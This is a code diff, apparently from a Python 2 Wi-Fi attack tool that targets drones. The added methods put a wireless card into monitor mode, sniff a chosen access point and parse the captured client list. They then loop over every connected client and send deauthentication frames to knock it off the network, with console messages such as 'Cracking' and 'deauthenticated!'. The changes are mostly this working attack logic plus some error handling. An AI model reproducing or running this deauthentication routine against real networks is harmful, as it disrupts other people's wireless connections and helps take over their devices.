@@ -1,6 +1,9 @@
 from accesspoint import AccessPoint
+from target import Target
 import commands
 import re
+import time
+import sys
 
 class Environment:
     
@@ -9,6 +12,7 @@ class Environment:
         self.device = d
         self.ssid = s
         self.accesspoints = None
+        self.targets = None
         self.mondevice = None
         self.monitormode = False
         self.initialized = False
@@ -33,6 +37,8 @@ class Environment:
         if index < len(self.accesspoints):
             print 'Cracking ' + str(self.accesspoints[index])
             self.__startmonitormode(index)
+            self.__gettargets(index)
+            self.__deauthtargets()
             self.__stopmonitormode()
         else:
             print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
@@ -55,6 +61,30 @@ class Environment:
         return accesspoints
     
     
+    def __deauthtargets(self):
+        
+        for target in self.targets:
+            print str(target.mac) + ' deauthenticated!'
+            commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
+    
+    
+    def __gettargets(self, index):
+        
+        accesspoint = self.accesspoints[index]
+        commands.cleanfiles(accesspoint.dumpfilename, wildcard=True)
+        commands.sniffssid(self.mondevice, accesspoint.ssid, accesspoint.channel, accesspoint.dumpfilename)
+        
+        time.sleep(15)
+        
+        try:
+            with open(accesspoint.dumpfilename + '-01.csv', 'r') as f:
+                lines = f.readlines()
+                accesspoint.mac = ((lines[2].split(','))[0]).strip()
+                self.targets = map(lambda client: Target(client.split(',')[0], accesspoint), filter(lambda fullline: accesspoint.mac in fullline, filter(lambda line: len(line.strip()) > 1, lines[5:])))
+        except IOError:
+            pass
+    
+    
     def __startmonitormode(self, index):
         
         accesspoint = self.accesspoints[index]
@@ -62,10 +92,16 @@ class Environment:
         commands.disabledevice(self.device)
         out = commands.startmonitormode(self.device, accesspoint.channel)
 
-        self.mondevice = re.match(r'(.*)](.*)\)', ''.join(filter(lambda line: 'monitor mode vif enabled' in line, out.split('\n')))).groups('0')[1]
-        self.monitormode = True
+        try:
+            self.mondevice = re.match(r'(.*)](.*)\)', ''.join(filter(lambda line: 'monitor mode vif enabled' in line, out.split('\n')))).groups('0')[1]
+            self.monitormode = True
+            print 'Monitor mode started on ' + self.mondevice + '...'
+        except AttributeError:
+            print 'Error entering monitor mode...'
+        except:
+            print("Unexpected error:", sys.exc_info()[0])
+            raise
         
-        print 'Monitor mode started on ' + self.mondevice + '...'
         
     def __stopmonitormode(self):
         
